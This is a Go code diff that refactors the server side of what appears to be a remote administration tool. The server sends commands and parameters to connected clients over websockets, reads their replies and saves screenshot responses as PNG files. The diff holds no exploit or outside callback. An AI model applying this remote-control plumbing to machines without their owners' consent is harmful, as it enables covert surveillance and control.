@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"github.com/google/uuid"
 	"github.com/gorilla/websocket"
+	"github.com/tiagorlampert/CHAOS/entities"
 	"github.com/tiagorlampert/CHAOS/internal"
 	"github.com/tiagorlampert/CHAOS/internal/environment"
 	"github.com/tiagorlampert/CHAOS/internal/utils"
@@ -15,7 +16,6 @@ import (
 	"github.com/tiagorlampert/CHAOS/presentation/http/request"
 	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
 	"github.com/tiagorlampert/CHAOS/services/auth"
-	"github.com/tiagorlampert/CHAOS/services/payload"
 	"net"
 	"net/url"
 	"os/exec"
@@ -24,30 +24,27 @@ import (
 )
 
 type clientService struct {
-	AppVersion     string
-	Clients        map[string]*websocket.Conn
-	Mu             *sync.Mutex
-	configuration  *environment.Configuration
-	Repository     authRepo.Repository
-	PayloadService payload.Service
-	AuthService    auth.Service
+	AppVersion    string
+	Clients       map[string]*websocket.Conn
+	Mu            *sync.Mutex
+	configuration *environment.Configuration
+	Repository    authRepo.Repository
+	AuthService   auth.Service
 }
 
 func NewClientService(
 	appVersion string,
 	configuration *environment.Configuration,
 	repository authRepo.Repository,
-	payloadCache payload.Service,
 	authService auth.Service,
 ) Service {
 	return &clientService{
-		AppVersion:     appVersion,
-		configuration:  configuration,
-		Clients:        make(map[string]*websocket.Conn, 0),
-		Mu:             &sync.Mutex{},
-		Repository:     repository,
-		PayloadService: payloadCache,
-		AuthService:    authService,
+		AppVersion:    appVersion,
+		configuration: configuration,
+		Clients:       make(map[string]*websocket.Conn, 0),
+		Mu:            &sync.Mutex{},
+		Repository:    repository,
+		AuthService:   authService,
 	}
 }
 
@@ -78,40 +75,41 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
 	}
 
-	requestMessage, err := json.Marshal(payload.Data{
-		Request: input.Request,
-	})
+	command := &entities.Command{
+		Command:   input.Command,
+		Parameter: input.Parameter,
+	}
+
+	req, err := json.Marshal(command)
 	if err != nil {
 		return SendCommandOutput{}, err
 	}
 
-	err = client.WriteMessage(websocket.BinaryMessage, requestMessage)
+	err = client.WriteMessage(websocket.BinaryMessage, req)
 	if err != nil {
 		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
 	}
 
-	_, responseMessage, err := client.ReadMessage()
+	_, readMessage, err := client.ReadMessage()
 	if err != nil {
 		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
 	}
 
 	var response request.RespondCommandRequestBody
-	if err := json.Unmarshal(responseMessage, &response); err != nil {
+	if err := json.Unmarshal(readMessage, &response); err != nil {
 		return SendCommandOutput{}, err
 	}
 
-	data := &payload.Data{
-		Response: response.Response,
-		HasError: response.HasError,
-	}
+	command.Response = response.Response
+	command.HasError = response.HasError
 
-	data, err = HandleResponse(data)
+	command, err = handleResponse(command)
 	if err != nil {
 		return SendCommandOutput{}, err
 	}
 
-	res := utils.ByteToString(data.Response)
-	if data.HasError {
+	res := utils.ByteToString(command.Response)
+	if command.HasError {
 		return SendCommandOutput{}, fmt.Errorf(res)
 	}
 	if len(strings.TrimSpace(res)) == 0 {
@@ -120,14 +118,14 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 	return SendCommandOutput{Response: res}, nil
 }
 
-func HandleResponse(payload *payload.Data) (*payload.Data, error) {
-	switch payload.Request {
+func handleResponse(payload *entities.Command) (*entities.Command, error) {
+	switch payload.Command {
 	case "screenshot":
-		file, err := image.WritePNG(payload.Response)
+		filepath, err := image.WritePNG(payload.Response)
 		if err != nil {
 			return nil, err
 		}
-		payload.Response = utils.StringToByte(file)
+		payload.Response = utils.StringToByte(filepath)
 		break
 	default:
 		return payload, nil
